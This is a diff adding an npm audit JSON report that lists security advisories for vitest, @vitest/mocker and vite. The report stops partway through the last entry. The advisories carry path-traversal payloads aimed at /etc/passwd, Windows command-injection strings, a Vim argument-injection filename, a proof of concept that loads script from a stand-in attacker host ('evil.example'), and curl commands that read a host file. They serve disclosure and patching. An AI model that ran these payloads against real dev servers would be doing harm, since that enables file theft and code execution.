@@ -1,0 +1,358 @@
+{
+  "actions": [
+    {
+      "action": "review",
+      "module": "vitest",
+      "resolves": [
+        {
+          "id": 1193683,
+          "path": "apps__web>vitest",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@vitest/mocker",
+      "resolves": [
+        {
+          "id": 1193684,
+          "path": "apps__web>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242767,
+          "path": "apps__web>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "vite",
+      "resolves": [
+        {
+          "id": 1242624,
+          "path": "apps__web>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242653,
+          "path": "apps__web>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242660,
+          "path": "apps__web>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242726,
+          "path": "apps__web>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242732,
+          "path": "apps__web>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1193683": {
+      "findings": [
+        {
+          "version": "4.1.10",
+          "paths": ["apps__web>vitest"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84373\n- https://github.com/vitest-dev/vitest/pull/10972\n- https://github.com/vitest-dev/vitest/pull/10974\n- https://github.com/vitest-dev/vitest/commit/51edf2b072902aec6d30c90ebaafd8f121c6f9d8\n- https://github.com/vitest-dev/vitest/commit/8ff9b9a9efca7c6cfd5243569440de8d7a33aec4\n- https://github.com/vitest-dev/vitest/commit/fe5a11d3ceac5ec10d6d7d21a46d4caca132c48f\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.11\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.0-rc.2\n- https://github.com/advisories/GHSA-82fw-gwwq-j7x9",
+      "created": "2026-09-08T20:46:45.000Z",
+      "id": 1193683,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n`@vitest/mocker` registers a redirect mock's target path without validating it\nagainst the dev server's file-serving allowlist. An attacker who can reach the\ndev server's WebSocket can register a redirect mock pointing outside the project\nroot; when the mocked module is requested, the plugin's `load` hook returns\n`readFile(<attacker path>)` as the module source, disclosing local files.\n\nThis is exploitable **without authentication** only through the public\n`mockerPlugin` / standalone `interceptorPlugin` exports (used by third-party dev\nservers), which register the handler on Vite's unauthenticated HMR socket.\nVitest's own browser mode registers mocks over a **token-authenticated** RPC and\nis not remotely reachable by default (see Scope).\n\n## Affected code\n`packages/mocker/src/node/interceptorPlugin.ts`.\n\nThe `load` hook is the file-read sink:\n\n```ts\nif (mock.type === 'redirect') {\n  return readFile(mock.redirect, 'utf-8')\n}\n```\n\n`mock.redirect` is derived from client input at registration time with no\nboundary check:\n\n```ts\nif (event.type === 'redirect') {\n  const redirectUrl = new URL(event.redirect)\n  event.redirect = join(server.config.root, redirectUrl.pathname)\n}\nregistry.register(event)\n```\n\nThere is no `server.fs.allow` / `server.fs.deny` check and no assertion that the\nresolved path stays within the project root.\n\n## Registration paths and trust boundaries\n- **Public `mockerPlugin` / `interceptorPlugin` (unauthenticated).** In\n  `configureServer`, the plugin registers `server.ws.on('vitest:interceptor:register', …)`\n  on Vite's HMR WebSocket. That socket performs no token, Origin, or same-origin\n  check, so any client that can reach it can register a redirect mock. This is\n  the path the \"unauthenticated\" impact applies to.\n- **Vitest browser mode (authenticated).** Mocks register over the browser RPC\n  (`registerMock`), which sits behind a per-run token (`isValidApiRequest`, a\n  random `api.token`). The interceptor's `configureServer` socket is not used for\n  registration here (in v5 it does not run at all, as the plugin is injected per\n  environment). The same missing boundary check exists on the authenticated RPC\n  path, but reaching it requires the token, so it is not a remote-unauthenticated\n  read.\n\n## Path handling\n`new URL(redirect).pathname` combined with `join(root, pathname)` does **not**\nconfine reads to the root:\n\n- Special/hierarchical schemes (`file:`, `http:`) are normalized by WHATWG URL,\n  so `..` segments are collapsed and the result stays under the root. Payloads of\n  the form `file:///../../etc/passwd` do **not** escape.\n- A non-special (opaque) scheme preserves `..` in `pathname`, so\n  `join(root, \"../../…/etc/passwd\")` resolves outside the root and reads an\n  arbitrary file.\n\nEven without escaping the root, the missing `server.fs` check allows reading any\nin-root file the dev server would otherwise refuse to serve (for example an\nin-root `.env` or source that is denied by `server.fs.deny`).\n\n## Scope / preconditions\n- This is a **development-server** issue. The dev server binds to `localhost` by\n  default and is not reachable from the network unless the developer exposes it\n  (`server.host` / `0.0.0.0`, a LAN bind, or a proxy).\n- A raw (non-browser) client against a reachable server bypasses browser origin\n  and CORS protections entirely and can both register the mock and read the\n  response.\n- A browser-based drive-by against a localhost server is substantially mitigated\n  by Vite defaults: the default CORS origin allowlist is limited to `localhost`\n  origins, and `server.allowedHosts` blocks DNS-rebinding, so a cross-origin page\n  cannot read the file contents back.\n\n## Impact\nDisclosure of local files readable by the dev-server process (source, in-root\n`.env`/secrets, and, via the opaque-scheme payload, files outside the project\nroot). No integrity or availability impact.\n\n## Affected versions\nPresent since `@vitest/mocker` was introduced.\n\n- **Affected: `@vitest/mocker` >= 2.1.0** (shipped in `vitest` and\n  `@vitest/browser` >= 2.1.0), through 4.1.x and the 5.0.0 pre-releases.\n- **Fixed:** Vitest 4.1.11 and 5.0.0. Older majors (2.1.x, 3.x) are not\n  maintained and are not planned to receive the fix.\n\n## Fix\nValidate the resolved redirect target against Vite's file-serving allowlist\n(`isFileLoadingAllowed`) before registering it, at every registration site, and\nstop registering the interceptor WebSocket events in Vitest's browser mode\n(mocks there flow through the authenticated RPC).",
+      "reported_by": null,
+      "title": "Vitest: Path Traversal / Arbitrary File Read via @vitest/mocker Redirect Mock",
+      "metadata": null,
+      "cves": ["CVE-2026-84373"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vitest",
+      "vulnerable_versions": ">=2.1.0 <4.1.11",
+      "github_advisory_id": "GHSA-82fw-gwwq-j7x9",
+      "recommendation": "Upgrade to version 4.1.11 or later",
+      "patched_versions": ">=4.1.11",
+      "updated": "2026-09-08T20:46:47.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": ["CWE-22"],
+      "url": "https://github.com/advisories/GHSA-82fw-gwwq-j7x9"
+    },
+    "1193684": {
+      "findings": [
+        {
+          "version": "4.1.10",
+          "paths": ["apps__web>vitest>@vitest/mocker"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84373\n- https://github.com/vitest-dev/vitest/pull/10972\n- https://github.com/vitest-dev/vitest/pull/10974\n- https://github.com/vitest-dev/vitest/commit/51edf2b072902aec6d30c90ebaafd8f121c6f9d8\n- https://github.com/vitest-dev/vitest/commit/8ff9b9a9efca7c6cfd5243569440de8d7a33aec4\n- https://github.com/vitest-dev/vitest/commit/fe5a11d3ceac5ec10d6d7d21a46d4caca132c48f\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.11\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.0-rc.2\n- https://github.com/advisories/GHSA-82fw-gwwq-j7x9",
+      "created": "2026-09-08T20:46:45.000Z",
+      "id": 1193684,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n`@vitest/mocker` registers a redirect mock's target path without validating it\nagainst the dev server's file-serving allowlist. An attacker who can reach the\ndev server's WebSocket can register a redirect mock pointing outside the project\nroot; when the mocked module is requested, the plugin's `load` hook returns\n`readFile(<attacker path>)` as the module source, disclosing local files.\n\nThis is exploitable **without authentication** only through the public\n`mockerPlugin` / standalone `interceptorPlugin` exports (used by third-party dev\nservers), which register the handler on Vite's unauthenticated HMR socket.\nVitest's own browser mode registers mocks over a **token-authenticated** RPC and\nis not remotely reachable by default (see Scope).\n\n## Affected code\n`packages/mocker/src/node/interceptorPlugin.ts`.\n\nThe `load` hook is the file-read sink:\n\n```ts\nif (mock.type === 'redirect') {\n  return readFile(mock.redirect, 'utf-8')\n}\n```\n\n`mock.redirect` is derived from client input at registration time with no\nboundary check:\n\n```ts\nif (event.type === 'redirect') {\n  const redirectUrl = new URL(event.redirect)\n  event.redirect = join(server.config.root, redirectUrl.pathname)\n}\nregistry.register(event)\n```\n\nThere is no `server.fs.allow` / `server.fs.deny` check and no assertion that the\nresolved path stays within the project root.\n\n## Registration paths and trust boundaries\n- **Public `mockerPlugin` / `interceptorPlugin` (unauthenticated).** In\n  `configureServer`, the plugin registers `server.ws.on('vitest:interceptor:register', …)`\n  on Vite's HMR WebSocket. That socket performs no token, Origin, or same-origin\n  check, so any client that can reach it can register a redirect mock. This is\n  the path the \"unauthenticated\" impact applies to.\n- **Vitest browser mode (authenticated).** Mocks register over the browser RPC\n  (`registerMock`), which sits behind a per-run token (`isValidApiRequest`, a\n  random `api.token`). The interceptor's `configureServer` socket is not used for\n  registration here (in v5 it does not run at all, as the plugin is injected per\n  environment). The same missing boundary check exists on the authenticated RPC\n  path, but reaching it requires the token, so it is not a remote-unauthenticated\n  read.\n\n## Path handling\n`new URL(redirect).pathname` combined with `join(root, pathname)` does **not**\nconfine reads to the root:\n\n- Special/hierarchical schemes (`file:`, `http:`) are normalized by WHATWG URL,\n  so `..` segments are collapsed and the result stays under the root. Payloads of\n  the form `file:///../../etc/passwd` do **not** escape.\n- A non-special (opaque) scheme preserves `..` in `pathname`, so\n  `join(root, \"../../…/etc/passwd\")` resolves outside the root and reads an\n  arbitrary file.\n\nEven without escaping the root, the missing `server.fs` check allows reading any\nin-root file the dev server would otherwise refuse to serve (for example an\nin-root `.env` or source that is denied by `server.fs.deny`).\n\n## Scope / preconditions\n- This is a **development-server** issue. The dev server binds to `localhost` by\n  default and is not reachable from the network unless the developer exposes it\n  (`server.host` / `0.0.0.0`, a LAN bind, or a proxy).\n- A raw (non-browser) client against a reachable server bypasses browser origin\n  and CORS protections entirely and can both register the mock and read the\n  response.\n- A browser-based drive-by against a localhost server is substantially mitigated\n  by Vite defaults: the default CORS origin allowlist is limited to `localhost`\n  origins, and `server.allowedHosts` blocks DNS-rebinding, so a cross-origin page\n  cannot read the file contents back.\n\n## Impact\nDisclosure of local files readable by the dev-server process (source, in-root\n`.env`/secrets, and, via the opaque-scheme payload, files outside the project\nroot). No integrity or availability impact.\n\n## Affected versions\nPresent since `@vitest/mocker` was introduced.\n\n- **Affected: `@vitest/mocker` >= 2.1.0** (shipped in `vitest` and\n  `@vitest/browser` >= 2.1.0), through 4.1.x and the 5.0.0 pre-releases.\n- **Fixed:** Vitest 4.1.11 and 5.0.0. Older majors (2.1.x, 3.x) are not\n  maintained and are not planned to receive the fix.\n\n## Fix\nValidate the resolved redirect target against Vite's file-serving allowlist\n(`isFileLoadingAllowed`) before registering it, at every registration site, and\nstop registering the interceptor WebSocket events in Vitest's browser mode\n(mocks there flow through the authenticated RPC).",
+      "reported_by": null,
+      "title": "Vitest: Path Traversal / Arbitrary File Read via @vitest/mocker Redirect Mock",
+      "metadata": null,
+      "cves": ["CVE-2026-84373"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@vitest/mocker",
+      "vulnerable_versions": ">=2.1.0 <4.1.11",
+      "github_advisory_id": "GHSA-82fw-gwwq-j7x9",
+      "recommendation": "Upgrade to version 4.1.11 or later",
+      "patched_versions": ">=4.1.11",
+      "updated": "2026-09-08T20:46:47.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": ["CWE-22"],
+      "url": "https://github.com/advisories/GHSA-82fw-gwwq-j7x9"
+    },
+    "1242624": {
+      "findings": [
+        {
+          "version": "8.1.5",
+          "paths": ["apps__web>vite"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112943\n- https://github.com/vitejs/launch-editor/pull/155\n- https://github.com/vitejs/launch-editor/commit/3c2f9bf2ff8fe63d056a8f9cc52d825b66ca79fc\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-698v-4r3x-3vcv",
+      "created": "2026-10-20T18:30:24.000Z",
+      "id": 1242624,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` did not escape `%` on Windows when passing an argument to `cmd`. When an environment variable contained a malicious value, it was possible that that content to be executed.\n\n### Impact\n\nOnly apps that match all of the following conditions are affected:\n\n- The user uses Windows\n- An attacker can place a file with the malicious filename containing `&` or `%`\n- Either of\n  - An attacker can inject an environment variable with a malicious value\n  - An attacker can add a NTFS alternate data stream to the file placed\n\n### Details\n\nUnlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called directly using [`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options) and requires passing them as an argument of `cmd.exe`. To do so, launch-editor escapes the arguments passed to `cmd.exe`. But `launch-editor` did not escape `%` which is used for environment variables.\n\nBecause `launch-editor` checks if the argument matches an existing filename, the attack requires the attacker to be able to place a file.\n\n- If the attacker can inject an environment variable as well, they can include the subcommand in the env variable (e.g. set ` &calc.exe ` to `%ENV%`) and call `launchEditor` with `something%ENV%`.\n- If the attacker can place a NTFS alternate data stream to the file (e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call `launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.\n- If the attacker can create a filename containing the `%CD%` and the subcommand (e.g. `&calc.exe `), they can call `launchEditor` with `./%CD%`",
+      "reported_by": null,
+      "title": "launch-editor: escapeCmdArgs() omits % escaping on Windows",
+      "metadata": null,
+      "cves": ["CVE-2026-112943"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.0.0 <=8.1.5",
+      "github_advisory_id": "GHSA-698v-4r3x-3vcv",
+      "recommendation": "Upgrade to version 8.1.6 or later",
+      "patched_versions": ">=8.1.6",
+      "updated": "2026-10-20T18:30:25.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-78"],
+      "url": "https://github.com/advisories/GHSA-698v-4r3x-3vcv"
+    },
+    "1242653": {
+      "findings": [
+        {
+          "version": "8.1.5",
+          "paths": ["apps__web>vite"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-r825-w8mm-5pxw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112944\n- https://github.com/vitejs/launch-editor/pull/156\n- https://github.com/vitejs/launch-editor/commit/f6e6701bb1f16f2dd242b321374f1b6cca6eb6d4\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-r825-w8mm-5pxw",
+      "created": "2026-10-20T19:51:52.000Z",
+      "id": 1242653,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` forwarded file paths directly to editors without sanitization. If a path resembles a CLI flag, editors like Vim may interpret it as a command, potentially causing unintended file overwrites or command execution.\n\n### Impact\n\n#### Direct `launch-editor` users\n\nOnly apps that match all of the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- The first argument of `launchEditor` can start with `+` or `-` or the user is using WSL\n\n#### `launch-editor-middleware` users\n\nOnly apps that match the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- launch-editor older than v2.2.0 is used, or the user is using WSL\n\n#### Vite users\n\nOnly apps that match the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- The user is using WSL\n\n### Details\n\n`launchEditor(file)` function passes the file name as-is to the editor if the file with that file name exists. If the file name starts with `-` (also `+` for Vim), the editor treats them as flags rather than positional arguments. For example, Vim treats arguments starting with `+` as an Ex command. As a result, an existing relative directory such as:\n```\n+call writefile([\"SAFE_MARKER\"],\"LAUNCH_EDITOR_MARKER\")|qa!\n```\nis not treated as a filename when passed to Vim. Vim executes the embedded Ex command.\n\nThe following editor has a potentially destructive operation exposed to the CLI arguments:\n- Vim (including gVim)\n- MacVim\n- Emacs (including Emacsclient)\n- Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n\n`launch-editor-middleware` v2.2.0+ converts the passed file path to an absolute path so those are not affected as long as the user is not using WSL. For WSL, `launch-editor` converts the paths to relative paths internally, so those are still affected.\n\nVite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are only affected.",
+      "reported_by": null,
+      "title": "launch-editor: Editor CLI flag misinterpretation causing arbitrary command execution for some editors",
+      "metadata": null,
+      "cves": ["CVE-2026-112944"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.0.0 <=8.1.5",
+      "github_advisory_id": "GHSA-r825-w8mm-5pxw",
+      "recommendation": "Upgrade to version 8.1.6 or later",
+      "patched_versions": ">=8.1.6",
+      "updated": "2026-10-20T19:51:54.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-88"],
+      "url": "https://github.com/advisories/GHSA-r825-w8mm-5pxw"
+    },
+    "1242660": {
+      "findings": [
+        {
+          "version": "8.1.5",
+          "paths": ["apps__web>vite"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-587h-7wmj-h5pm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112942\n- https://github.com/vitejs/launch-editor/commit/f13cd835d4b8e860b1d4d080ad8a490cc2463679\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-587h-7wmj-h5pm",
+      "created": "2026-10-20T19:48:25.000Z",
+      "id": 1242660,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` checked `fs.existsSync(fileName)` before passing a supplied path to an editor command. On Windows, an attacker can bypass this check with a crafted path ending in `\\\\..:line:column`. This removes the requirement that the attacker be able to place a file with a malicious filename.\n\nCombined with the `%` escaping issue described in [GHSA-698v-4r3x-3vcv](https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv), this bypass can lead to OS command injection when an attacker controls the file argument.\n\n### Impact\n\nOnly apps that runs on Windows is affected.\n\n### Details\n\nThe earlier advisory assumed that `fs.existsSync()` required an attacker-controlled filename to exist. This advisory covers a bypass of that requirement.\n\nA crafted value ending in `\\\\..:1:1` is interpreted differently by `launch-editor-middleware`, `launch-editor`, and Windows:\n\n1. `launch-editor-middleware` calls `path.resolve()` while the final path component is `..:1:1`, so it is not treated as a parent-directory component.\n2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes it, leaving a path ending in `\\\\..`.\n3. On Windows, `fs.existsSync()` accepts the resulting path as the existing parent directory even though the attacker-controlled preceding component does not exist.\n4. Because the existence check passes, the crafted filename reaches the Windows shell command.",
+      "reported_by": null,
+      "title": "launch-editor: `fs.existsSync()` existence check can be bypassed on Windows",
+      "metadata": null,
+      "cves": ["CVE-2026-112942"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.0.0 <=8.1.5",
+      "github_advisory_id": "GHSA-587h-7wmj-h5pm",
+      "recommendation": "Upgrade to version 8.1.6 or later",
+      "patched_versions": ">=8.1.6",
+      "updated": "2026-10-20T19:48:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-77"],
+      "url": "https://github.com/advisories/GHSA-587h-7wmj-h5pm"
+    },
+    "1242726": {
+      "findings": [
+        {
+          "version": "8.1.5",
+          "paths": ["apps__web>vite"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-9jrq-w75r-8gcw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112945\n- https://github.com/vitejs/vite/pull/23653\n- https://github.com/vitejs/vite/commit/7dafd8e56f152403a3230608fa4005273c2e9e17\n- https://github.com/advisories/GHSA-9jrq-w75r-8gcw",
+      "created": "2026-10-21T16:48:14.000Z",
+      "id": 1242726,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nWhen accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n- the transformed HTML contains an inline module script\n- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\n### Details\n\n[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\n```js\nconst url = req.originalUrl\ntemplate = await vite.transformIndexHtml(url, template)\n```\n\nFor a development server at `http://localhost:5173`, an attacker can send this URL:\n\n```text\nhttp://localhost:5173//evil.example/payload.js?/../../package.json\n```\n\nIn Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\nChromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\n[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\n```html\n<script type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy&index=0.js\"></script>\n```\n\nThe generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\n### PoC\n\n```js\nimport { createServer as createHttpServer } from 'node:http'\nimport { createRequire } from 'node:module'\nimport { dirname, join } from 'node:path'\nimport { fileURLToPath, pathToFileURL } from 'node:url'\n\nconst directory = dirname(fileURLToPath(import.meta.url))\nconst require = createRequire(join(directory, 'package.json'))\nconst { chromium } = require('playwright-chromium')\nconst viteModule = await import(\n  pathToFileURL(require.resolve('vite')).href\n)\nconst createViteServer =\n  viteModule.createServer ?? viteModule.default.createServer\n\n// This loopback server stands in for a separately hosted attacker website.\nconst attackerPort = 4173\nconst exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\nconst html = '<script type=\"module\">document.body.textContent = \"Vite app\"</script>'\n\nconst listen = (server, port = 0) =>\n  new Promise((resolve, reject) => {\n    server.once('error', reject)\n    server.listen(port, '127.0.0.1', () => {\n      server.off('error', reject)\n      resolve(server.address().port)\n    })\n  })\n\nconst close = (server) =>\n  new Promise((resolve, reject) => {\n    server.close((error) => (error ? reject(error) : resolve()))\n  })\n\nlet attackerRequest = null\nconst attacker = createHttpServer((request, response) => {\n  attackerRequest = request.url\n  response.writeHead(200, {\n    'access-control-allow-origin': '*',\n    'content-type': 'text/javascript',\n  })\n  response.end(\n    \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n  )\n})\n\nconst vite = await createViteServer({\n  appType: 'custom',\n  configFile: false,\n  root: directory,\n  server: {\n    hmr: false,\n    middlewareMode: true,\n    watch: null,\n  },\n})\n\nconst application = createHttpServer((request, response) => {\n  vite.middlewares(request, response, async (error) => {\n    if (error) {\n      response.destroy(error)\n      return\n    }\n\n    try {\n      const transformed = await vite.transformIndexHtml(request.url, html)\n      response.writeHead(200, { 'content-type': 'text/html' })\n      response.end(transformed)\n    } catch (transformError) {\n      response.destroy(transformError)\n    }\n  })\n})\n\nawait listen(attacker, attackerPort)\nconst applicationPort = await listen(application)\nconst browser = await chromium.launch({ headless: true })\n\ntry {\n  const page = await browser.newPage()\n  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n  await page.waitForFunction(\n    () => document.documentElement.dataset.viteXssPoc === 'executed',\n  )\n\n  console.log(`attacker request: ${attackerRequest}`)\n  console.log('JavaScript from the attacker server executed in the Vite page')\n} finally {\n  await browser.close()\n  await close(application)\n  await vite.close()\n  await close(attacker)\n}\n```\n\nObserved output on Vite 8.2.1:\n```text\nattacker request: /payload.js?/../../package.json?html-proxy&index=0.js\nJavaScript from the attacker server executed in the Vite page\n```",
+      "reported_by": null,
+      "title": "Vite: Cross origin script execution through Vite custom middleware",
+      "metadata": null,
+      "cves": ["CVE-2026-112945"],
+      "access": "public",
+      "severity": "low",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.0.0 <=8.1.5",
+      "github_advisory_id": "GHSA-9jrq-w75r-8gcw",
+      "recommendation": "Upgrade to version 8.1.6 or later",
+      "patched_versions": ">=8.1.6",
+      "updated": "2026-10-21T16:48:15.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-80"],
+      "url": "https://github.com/advisories/GHSA-9jrq-w75r-8gcw"
+    },
+    "1242732": {
+      "findings": [
+        {
+          "version": "8.1.5",
+          "paths": ["apps__web>vite"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-rq7h-c2jc-7f22\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112946\n- https://github.com/vitejs/vite/pull/23656\n- https://github.com/vitejs/vite/commit/170b92791421bcd484f7325936d989a82d6bd4aa\n- https://github.com/vitejs/vite/commit/45c0e3392a298626955a0ab93a8e51232daac721\n- https://github.com/vitejs/vite/commit/c3e06f92e969952466b4e2f5801e85e1e00cd905\n- https://github.com/vitejs/vite/commit/e570d8d016096b5f8f6f09808376ca6cf73f27d0\n- https://github.com/vitejs/vite/commit/f0d76c7da13d5e794807b82f0b86c1931a8438e3\n- https://github.com/advisories/GHSA-rq7h-c2jc-7f22",
+      "created": "2026-10-21T16:47:42.000Z",
+      "id": 1242732,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe content of files outside `server.fs` setting can be returned to the browser if the project imports a file path concatenated with the `root`. For example, if the project references `<path-to-project-root>/etc/hosts`, the content of `/etc/hosts` was possible to be returned.\n\nThe content of files outside the `server.fs.allow` option can be returned to the browser when a project imports a file whose root-relative path matches an absolute path on the host. For example, referencing `<project-root>/etc/hosts` could make Vite return the host's `/etc/hosts` file.\n\n### Impact\n\nOnly apps that meet all of the following conditions are affected:\n\n- explicitly expose the Vite dev server to the network (using `--host` or the [`server.host` option](https://vite.dev/config/server-options#server-host))\n- contain an imported file whose root-relative browser URL is also the absolute path of a readable file on the host\n- The sensitive file is not matched by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)\n- the dev server is not running on Windows\n\n### Details\n\nWhen Vite analyzes an in-root import, it rewrites the resolved module ID to a browser URL such as `/etc/hostname`. In affected versions, Vite converts that URL with `fsPathFromUrl` and adds the result to `safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash without resolving the URL against the project root, the project URL `/etc/hostname` is recorded as if it were the absolute filesystem path `/etc/hostname`.\n\nFor a later request to `/@fs/etc/hostname`, the raw-filesystem middleware interprets `/etc/hostname` as an absolute path. The access check applies `server.fs.deny`, then accepts paths present in `safeModulePaths` before checking `server.fs.allow`. As a result, the request can return the host file instead of the project file that originally populated `safeModulePaths`.\n\n### PoC\nThe following example requires Linux with a readable `/etc/hostname`:\n```bash\n$ mkdir vite-safe-module-path-poc\n$ cd vite-safe-module-path-poc\n$ npm init -y\n$ npm install vite@8.3.1\n$ mkdir -p etc\n$ echo 'PROJECT-DECOY\\n' > etc/hostname\n$ echo 'import \"./etc/hostname\"\\n' > main.js\n$ npx vite --host 127.0.0.1\n```\n\nIn another terminal:\n```bash\n$ curl -o /dev/null -s -w '%{http_code}\\n' http://127.0.0.1:5173/main.js\n200\n$ curl -sS -o response -w '%{http_code}\\n' http://127.0.0.1:5173/@fs/etc/hostname\n200\n$ cmp -s response /etc/hostname && echo 'response matches host file'\nresponse matches host file\n```",
